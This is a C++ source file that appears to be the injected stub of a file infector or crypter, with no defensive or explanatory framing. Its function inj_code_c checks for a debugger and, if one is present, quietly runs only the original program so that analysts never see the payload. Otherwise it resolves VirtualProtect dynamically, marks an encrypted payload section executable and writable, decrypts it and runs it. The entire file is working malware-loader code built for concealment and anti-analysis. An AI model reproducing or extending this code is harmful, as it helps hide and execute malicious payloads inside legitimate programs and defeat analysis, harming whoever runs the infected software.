#include "payload.h"
#include <Windows.h>
#include "encrypt.hpp"
#include "injected.h"
#include "libproc.hpp"
#include "utils.h"

INJECTED_CODE VOID inj_code_c() {
#ifndef NO_ANTIDBG
    if (being_debugged()) {
        // __debugbreak();
        // __fastfail(FAST_FAIL_FATAL_APP_EXIT);
        // ((PVOID(*)())NULL)();

        // If we're being debugged, do not run the payload, just run the original program normally
        return;
    }
#endif  // NO_ANTIDBG

    CONST auto hKernel32Dll = GET_DLL(kernel32.dll);
    CONST auto pVirtualProtect = GET_FUNC(hKernel32Dll, VirtualProtect);

    CONST SIZE_T dwPayloadEncSize = &__payload_end - &__payload_enc_start;

    // Make the payload section writable
    DWORD dwOldProtect;
    pVirtualProtect(&__payload_enc_start, dwPayloadEncSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // Decrypt the payload
    DecryptPayload(&__payload_enc_start, dwPayloadEncSize);

    // Restore the original protection
    pVirtualProtect(&__payload_enc_start, dwPayloadEncSize, dwOldProtect, &dwOldProtect);

    run_payload(hKernel32Dll);
}
